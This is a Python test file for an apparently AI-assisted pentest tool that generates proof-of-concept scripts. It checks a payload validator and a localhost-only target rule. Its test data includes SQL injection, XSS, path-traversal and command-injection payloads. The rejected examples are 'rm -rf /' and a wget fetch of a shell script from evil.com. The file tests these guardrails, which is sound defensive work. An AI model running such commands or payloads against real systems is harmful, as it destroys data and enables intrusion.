"""
V3.0 AI Pentest - PoC Auto Generator Tests
"""
import pytest
from fp_sentinel.attack.v3_ai_pentest.poc_auto_generator import (
    PoCAutoGenerator,
    ChainAwarePocResult,
    GeneratedPocScript,
    generate_chain_poc,
    generate_verification_suite,
    _validate_payload,
    _FORBIDDEN_PAYLOAD_PATTERNS,
)
from fp_sentinel.attack.poc_templates import UnsafeTargetError
from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import AttackChainReasoner


class TestPayloadValidation:
    def test_default_payload_returned_for_empty(self):
        result = _validate_payload("", "sqli-union")
        assert result != ""

    def test_valid_payloads_accepted(self):
        valid = [
            "1\' UNION SELECT null-- -",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "; echo fp_sentinel_verify",
        ]
        for p in valid:
            result = _validate_payload(p, "sqli-union")
            assert result == p

    def test_forbidden_payloads_rejected(self):
        with pytest.raises(ValueError):
            _validate_payload("rm -rf /", "cmd-injection")

    def test_forbidden_external_fetch(self):
        with pytest.raises(ValueError):
            _validate_payload("wget http://evil.com/shell.sh", "cmd-injection")


class TestPoCAutoGenerator:
    def setup_method(self):
        self.gen = PoCAutoGenerator(default_target="http://127.0.0.1:8080")

    def test_generate_single_sqli(self):
        script = self.gen.generate_single("sqli-union")
        assert isinstance(script, GeneratedPocScript)
        assert script.vuln_type == "sqli-union"
        assert "127.0.0.1" in script.target

    def test_generate_single_custom_payload(self):
        script = self.gen.generate_single("sqli-union", payload="1\' OR 1=1-- -")
        assert script.custom_payload_used
        assert "1\' OR 1=1" in script.script_content

    def test_generate_single_invalid_target(self):
        with pytest.raises(UnsafeTargetError):
            self.gen.generate_single("sqli-union", target="http://evil.com")

    def test_generate_single_unknown_vuln_type(self):
        with pytest.raises(KeyError):
            self.gen.generate_single("no-such-vuln-type")

    def test_generate_for_chain(self):
        from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import ReasoningChain
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = self.gen.generate_for_chain(report.chains[0])
            assert isinstance(result, ChainAwarePocResult)
            assert len(result.scripts) >= 2
            assert result.combined_script != ""
            assert len(result.verification_plan) >= 2

    def test_generate_for_chain_with_custom_payload(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = self.gen.generate_for_chain(
                report.chains[0],
                custom_payloads={1: "custom-test-payload"}
            )
            assert isinstance(result, ChainAwarePocResult)

    def test_generate_verification_suite(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        results = self.gen.generate_for_report(report)
        assert isinstance(results, list)


class TestConvenienceAPIs:
    def test_generate_chain_poc_func(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = generate_chain_poc(report.chains[0])
            assert isinstance(result, ChainAwarePocResult)


class TestGeneratedPocScript:
    def test_script_has_safety_notes(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert len(script.safety_notes) > 0

    def test_script_has_run_instructions(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert script.run_instructions != ""
